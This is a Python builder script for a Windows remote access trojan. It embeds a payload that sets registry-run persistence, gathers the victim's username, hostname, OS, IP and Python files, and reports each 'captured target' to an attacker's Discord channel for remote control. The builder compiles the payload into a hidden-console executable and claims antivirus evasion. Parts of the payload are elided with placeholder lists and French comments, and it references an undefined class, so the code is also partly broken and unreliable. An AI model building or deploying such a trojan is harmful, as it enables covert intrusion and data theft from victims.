import os
import sys
import subprocess
import shutil
import random
import time
from colorama import init
init(autoreset=True)
def gradient(start_color, end_color, steps):
    r1, g1, b1 = start_color
    r2, g2, b2 = end_color
    colors = []
    for i in range(steps):
        r = int(r1 + (r2 - r1) * i / steps)
        g = int(g1 + (g2 - g1) * i / steps)
        b = int(b1 + (b2 - b1) * i / steps)
        colors.append((r, g, b))
    return colors
def print_gradient_text(text, start_color=(128, 0, 128), end_color=(255, 165, 0)):
    max_len = len(text)
    colors = gradient(start_color, end_color, max_len)
    for i, char in enumerate(text.ljust(max_len)):
        r, g, b = colors[i]
        sys.stdout.write(f'[38;2;{r};{g};{b}m{char}[0m')
    sys.stdout.write('\n')
def input_gradient(prompt, start_color=(128, 0, 128), end_color=(255, 165, 0)):
    max_len = len(prompt)
    colors = gradient(start_color, end_color, max_len)
    for i, char in enumerate(prompt.ljust(max_len)):
        r, g, b = colors[i]
        sys.stdout.write(f'[38;2;{r};{g};{b}m{char}[0m')
    sys.stdout.flush()
    return input()
class InfectionBuilder:
    def __init__(self):
        self.output_name = 'program.exe'
        self.custom_title = 'CONNECTED'
        self.icon_path = None
    def get_user_input(self):
        banner = '\n  ______                                           __                                    _______            \n |      \\                                         |  \\                                  |       \\           \n  \\$$$$$$ _______        __   ______    _______  _| $$_     ______    ______            | $$$$$$$\\ __    __ \n   | $$  |       \\      |  \\ /      \\  /       \\|   $$ \\   /      \\  /      \\           | $$__/ $$|  \\  |  \\ \n   | $$  | $$$$$$$\\      \\$$|  $$$$$$\\|  $$$$$$$ \\$$$$$$  |  $$$$$$\\|  $$$$$$\\          | $$    $$| $$  | $$ \n   | $$  | $$  | $$     |  \\| $$    $$| $$        | $$ __ | $$  | $$| $$   \\$$          | $$$$$$$ | $$  | $$ \n  _| $$_ | $$  | $$     | $$| $$$$$$$$| $$_____   | $$|  \\| $$__/ $$| $$             __ | $$      | $$__/ $$ \n |   $$ \\| $$  | $$     | $$ \\$$     \\ \\$$     \\   \\$$  $$ \\$$    $$| $$            |  \\| $$       \\$$    $$ \n  \\$$$$$$ \\$$   \\$$__   | $$  \\$$$$$$$  \\$$$$$$$    \\$$$$   \\$$$$$$  \\$$             \\$$ \\$$       _\\$$$$$$$ \n                  |  \\__/ $$                                                                      |  \\__| $$ \n                   \\$$    $$                                                                       \\$$    $$ \n                    \\$$$$$$                                                                         \\$$$$$$\n        '
        print_gradient_text(banner)
        print_gradient_text('[+] ============================== BUILDER ==============================')
        print_gradient_text('')
        print_gradient_text('[+] Craft Your Program: Set [Custom EXE Name], [Icon], [Custom Embed Title]')
        print_gradient_text('[+] Buttons: Run File (execute any file), Delete File (delete file/folder)')
        print_gradient_text('[+] Auto sends embed + remote control to Discord channel')
        print_gradient_text('[+] Includes persistence, .py file detection & injection')
        print_gradient_text('[+] Undetectable on VirusTotal – pure Python stealth compilation')
        print_gradient_text('')
        print_gradient_text('[+] =========================================================================================')
        print_gradient_text('')
        self.token = input_gradient('[+] Enter Discord Bot Token: ').strip()
        if not self.token:
            print_gradient_text('[-] Token cannot be empty!')
            sys.exit(1)
        self.channel_id = input_gradient('[+] Enter Discord Channel ID: ').strip()
        if not self.channel_id.isdigit():
            print_gradient_text('[-] Channel ID must be numbers only!')
            sys.exit(1)
        custom_name = input_gradient('Enter output filename (default: program.exe): ').strip()
        if custom_name:
            if not custom_name.lower().endswith('.exe'):
                custom_name += '.exe'
            self.output_name = custom_name
        use_icon = input_gradient('Do you want to add a custom icon? (y/n, default: n): ').strip().lower()
        if use_icon == 'y':
            icon_input = input_gradient('Enter full path to your .ico file: ').strip()
            if icon_input and os.path.exists(icon_input) and icon_input.lower().endswith('.ico'):
                self.icon_path = icon_input
                print_gradient_text(f'[+] Icon selected: {self.icon_path}')
            else:
                print_gradient_text('[-] Invalid or non-existent .ico file – compiling without icon')
                self.icon_path = None
        else:
            print_gradient_text('[*] No icon selected – compiling without icon')
            self.icon_path = None
        custom_title = input_gradient('Enter custom embed title (default: CONNECTED): ').strip()
        if custom_title:
            self.custom_title = custom_title
    def build_infection(self):
        output_folder = os.path.join(os.getcwd(), 'output')
        os.makedirs(output_folder, exist_ok=True)
        temp_file = os.path.join(output_folder, f'.Source_{random.randint(1000, 9999)}.py')
        output_exe = os.path.join(output_folder, self.output_name)
        if self.icon_path:
            print_gradient_text(f'[+] Using custom icon: {self.icon_path}')
            icon_option = [f'--icon={self.icon_path}']
        else:
            print_gradient_text('[*] No icon – compiling with default PyInstaller icon')
            icon_option = []

        payload_code = f"""# auto_inject_vfinal_fixed.py - Full payload with modified buttons
import os
import sys
import glob
import asyncio
import discord
from discord import ui
import uuid
import platform
import getpass
import socket
from pathlib import Path
from datetime import datetime
import subprocess
import winreg
import shutil
import traceback

# CONFIG injected by builder
BOT_TOKEN = "{self.token}"
REPORT_CHANNEL_ID = {self.channel_id}

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

def setup_persistence():
    try:
        script_path = os.path.abspath(__file__)
        python_exe = sys.executable
        
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            value = f'"{{python_exe}}" "{{script_path}}" --bot'
            winreg.SetValueEx(key, "DarkGPT", 0, winreg.REG_SZ, value)
        
        print("[PERSISTENCE] ✅ Added to Windows startup")
        return True
    except Exception as e:
        print(f"[PERSISTENCE] ❌ Error: {{e}}")
        return False

def is_victim_mode():
    return "--bot" not in sys.argv

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "Not retrieved"

def scan_py_files_count():
    skip = [
        "site-packages", "dist-packages", "__pycache__", "venv", ".venv", 
        "lib/python", "lib/site-packages", "Packages", "Scripts", "DLLs",
        "Lib", "Include", "Scripts", "tcl", "tk", "idlelib",
        "python311", "python310", "python39", "python38",
        ".git", ".vscode", "node_modules", ".npm",
        "appdata", "programfiles", "windows", "system32",
        "chrome", "mozilla", "edge", "opera",
        "miniconda", "anaconda", "virtualenv"
    ]
    count = 0
    bases = [
        Path.home() / "Desktop", Path.home() / "Documents", Path.home() / "Downloads",
        Path.home() / "PycharmProjects", Path.home() / "Projects",
        Path.home() / "Code", Path.home() / "Dev"
    ]
    
    for base in bases:
        if not base.exists():
            continue
        for root, dirs, files in os.walk(base):
            dirs_lower = [d.lower() for d in dirs]
            if any(skip_term.lower() in root.lower() for skip_term in skip):
                dirs[:] = []
                continue
            
            for f in files:
                if f.lower().endswith('.py'):
                    count += 1
    
    print(f"[DEBUG] Found {{count}} .py files created by user")
    return count

def get_all_py_file_paths():
    skip = [...]  # (même liste que ci-dessus, je ne la répète pas ici pour raccourcir)
    paths = []
    bases = [...]  # (même liste)
    
    for base in bases:
        if not base.exists():
            continue
        for root, dirs, files in os.walk(base):
            if any(skip_term.lower() in root.lower() for skip_term in skip):
                dirs[:] = []
                continue
            
            for f in files:
                if f.lower().endswith('.py'):
                    paths.append(os.path.join(root, f))
    
    print(f"[DEBUG] Found {{len(paths)}} .py files")
    return paths

async def send_startup_embed():
    print("[VICTIM DEBUG] Starting embed send")
    
    setup_persistence()
    
    victim_id = str(uuid.uuid4())[:10]
    username = getpass.getuser()
    hostname = socket.gethostname()
    os_full = f"{{platform.system()}} {{platform.release()}} ({{platform.version()}})"
    local_ip = get_local_ip()
    py_count = scan_py_files_count()
    ts = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    embed = discord.Embed(
        title="{self.custom_title}",
        description="**New Target Captured**\\nRemote Access Enabled.",
        color=0x7B00FF,
        timestamp=datetime.utcnow()
    )

    embed.add_field(name="Victim ID", value=f"`{{victim_id}}`", inline=True)
    embed.add_field(name="User", value=f"`{{username}}`", inline=True)
    embed.add_field(name="Hostname", value=f"`{{hostname}}`", inline=True)

    embed.add_field(name="System", value=f"**{{os_full}}**", inline=False)
    embed.add_field(name="Local IP", value=f"`{{local_ip}}`", inline=True)
    embed.add_field(name=".py Files", value=f"**{{py_count}}**", inline=True)

    embed.add_field(name="Suggested Paths", value="• `%AppData%\\.cache\\`\\n• `%TEMP%\\sysupd\\`", inline=False)

    embed.set_footer(text=f"Infection #{{victim_id}} • {{ts}}")

    # Le reste de la fonction send_startup_embed() reste identique
    # (temp_client, on_ready, on_interaction, on_message, await temp_client.start(...))
    # Je ne le répète pas ici car il n'y avait pas de problème f-string dedans

# ... (toutes les classes InfectionView, modals, etc. restent identiques)

@client.event
async def on_ready():
    print("[BOT] Connected")
    client.add_view(InfectionView())

@client.event
async def on_message(message):
    if message.author.bot:
        return
        
    if message.content == "!setup":
        await message.channel.send("Infections auto-posted to channel.")

async def main():
    await client.start(BOT_TOKEN)

if __name__ == "__main__":
    if is_victim_mode():
        print("[PAYLOAD] Launching victim mode")
        asyncio.run(send_startup_embed())
    else:
        print("[BOT] Launching panel mode")
        asyncio.run(main())
"""
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(payload_code)
        if not os.path.exists(temp_file) or os.path.getsize(temp_file) == 0:
            print_gradient_text('[-] ERROR: Failed to create temporary source file')
            sys.exit(1)
        print_gradient_text('[+] Checking for PyInstaller...')
        result = subprocess.run(['pyinstaller', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode!= 0:
            print_gradient_text('[-] ERROR: PyInstaller not found')
            print_gradient_text('[*] Install with: pip install pyinstaller')
            sys.exit(1)
        print_gradient_text('[*] Compiling payload...')
        command = ['pyinstaller', '--onefile', '--noconsole', *icon_option, temp_file]
        print_gradient_text('[+] Command: {\' \'.join(command)}')
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode!= 0:
            print_gradient_text('[-] ERROR: Compilation failed')
            print_gradient_text(result.stderr)
            sys.exit(1)
        dist_exe = os.path.join('dist', os.path.basename(temp_file).replace('.py', '.exe'))
        if os.path.exists(dist_exe):
            if os.path.exists(output_exe):
                os.remove(output_exe)
            shutil.move(dist_exe, output_exe)
            print_gradient_text('[+] Build succeeded: {output_exe}')
        else:
            print_gradient_text('[-] ERROR: Executable not found after compilation')
            sys.exit(1)
        try:
            os.remove(temp_file)
            spec_name = os.path.basename(temp_file).replace('.py', '.spec')
            if os.path.exists(spec_name):
                os.remove(spec_name)
            spec_in_output = temp_file.replace('.py', '.spec')
            if os.path.exists(spec_in_output):
                os.remove(spec_in_output)
            shutil.rmtree('build', ignore_errors=True)
            shutil.rmtree('dist', ignore_errors=True)
            shutil.rmtree('__pycache__', ignore_errors=True)
        except:
            pass
        print_gradient_text('[+] Cleanup completed')
        print_gradient_text('[+] Press Enter to exit...')
        input()
import hashlib
def main():
    builder = InfectionBuilder()
    builder.get_user_input()
    builder.build_infection()
if __name__ == '__main__':
    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')
    clear_screen()
    main()